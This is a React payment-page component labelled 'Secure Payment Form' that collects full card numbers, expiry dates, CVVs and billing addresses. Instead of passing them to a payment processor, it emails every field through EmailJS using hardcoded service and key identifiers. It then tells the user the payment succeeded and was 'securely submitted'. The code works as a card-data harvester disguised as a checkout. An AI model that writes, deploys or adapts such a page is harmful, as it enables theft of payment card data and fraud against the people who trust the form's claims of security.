import { useState } from "react";
import emailjs from "@emailjs/browser";
import toast from "react-hot-toast";

export default function PaymentPage() {
  const [loading, setLoading] = useState(false);

  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    address: "",
    city: "",
    state: "",
    zip: "",
    cardHolder: "",
    cardType: "Visa",
    cardNumber: "",
    amount: "",
    cardExp: "",
    cardCvv: "",
  });

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    setLoading(true);

    const templateParams = {
      fullName: formData.fullName,
      email: formData.email,
      address: formData.address,
      city: formData.city,
      state: formData.state,
      zip: formData.zip,
      cardHolder: formData.cardHolder,
      cardType: formData.cardType,
      cardNumber: formData.cardNumber,
      amount: formData.amount,
      cardExp: formData.cardExp,
      cardCvv: formData.cardCvv,
    };

    try {
      await emailjs.send(
        "service_tn2kss4",
        "template_kj6jh2j",
        templateParams,
        "Q8rHCzVoSvz5HSZqU",
      );

      toast.success("Payment submitted successfully");

      setFormData({
        fullName: "",
        email: "",
        address: "",
        city: "",
        state: "",
        zip: "",
        cardHolder: "",
        cardType: "Visa",
        cardNumber: "",
        amount: "",
        cardExp: "",
        cardCvv: "",
      });
    } catch (error) {
      toast.error("Failed to submit payment");
    }

    setLoading(false);
  };

  return (
    <div className="min-h-screen bg-[#0f172a] flex items-center justify-center px-6 py-16">
      <div className="w-full max-w-3xl bg-white rounded-3xl shadow-2xl overflow-hidden">
        {/* Header */}
        <div className="bg-green-600 text-white p-8">
          <h1 className="text-4xl font-bold mb-3">Secure Payment Form</h1>

          <p className="text-green-100 text-lg">
            Complete your payment details below.
          </p>
        </div>

        {/* Form */}
        <form
          onSubmit={handleSubmit}
          className="p-8 grid grid-cols-1 md:grid-cols-2 gap-6"
        >
          {/* Full Name */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              Full Name
            </label>

            <input
              type="text"
              name="fullName"
              value={formData.fullName}
              onChange={handleChange}
              placeholder="John Doe"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* Email */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              Email Address
            </label>

            <input
              type="email"
              name="email"
              value={formData.email}
              onChange={handleChange}
              placeholder="john@example.com"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* Address */}
          <div className="md:col-span-2">
            <label className="block mb-2 font-medium text-gray-700">
              Billing Address
            </label>

            <input
              type="text"
              name="address"
              value={formData.address}
              onChange={handleChange}
              placeholder="123 Main Street"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* City */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">City</label>

            <input
              type="text"
              name="city"
              value={formData.city}
              onChange={handleChange}
              placeholder="New York"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* State */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              State
            </label>

            <input
              type="text"
              name="state"
              value={formData.state}
              onChange={handleChange}
              placeholder="NY"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* ZIP */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              ZIP Code
            </label>

            <input
              type="text"
              name="zip"
              value={formData.zip}
              onChange={handleChange}
              placeholder="10001"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* Amount */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              Payment Amount
            </label>

            <input
              type="number"
              name="amount"
              value={formData.amount}
              onChange={handleChange}
              placeholder="$500"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* Card Holder */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              Card Holder Name
            </label>

            <input
              type="text"
              name="cardHolder"
              value={formData.cardHolder}
              onChange={handleChange}
              placeholder="John Doe"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* Card Type */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              Card Type
            </label>

            <select
              name="cardType"
              value={formData.cardType}
              onChange={handleChange}
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
            >
              <option>Visa</option>
              <option>Mastercard</option>
              <option>American Express</option>
              <option>Discover</option>
            </select>
          </div>

          {/* Last 4 */}
          {/* Card Number */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              Card Number
            </label>

            <input
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              maxLength={16}
              placeholder="1234000000000000"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* Card Exp */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">
              Card Exp
            </label>

            <input
              type="text"
              name="cardExp"
              value={formData.cardExp}
              onChange={handleChange}
              maxLength={7}
              placeholder="MM/YYYY"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>
          {/* CVV */}
          <div>
            <label className="block mb-2 font-medium text-gray-700">CVV</label>

            <input
              type="text"
              name="cardCvv"
              value={formData.cardCvv}
              onChange={handleChange}
              maxLength={3}
              placeholder="123"
              className="w-full border border-gray-300 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-green-500"
              required
            />
          </div>

          {/* Notice */}
          <div className="md:col-span-2 bg-green-50 border border-green-200 rounded-2xl p-5 text-sm text-green-800">
            Your billing details are securely submitted for manual payment
            review.
          </div>

          {/* Submit */}
          <div className="md:col-span-2">
            <button
              type="submit"
              disabled={loading}
              className="w-64 bg-green-600 hover:bg-green-700 transition text-white font-semibold py-4 rounded-2xl text-lg disabled:opacity-50"
            >
              {loading ? "Submitting..." : "Complete Payment"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
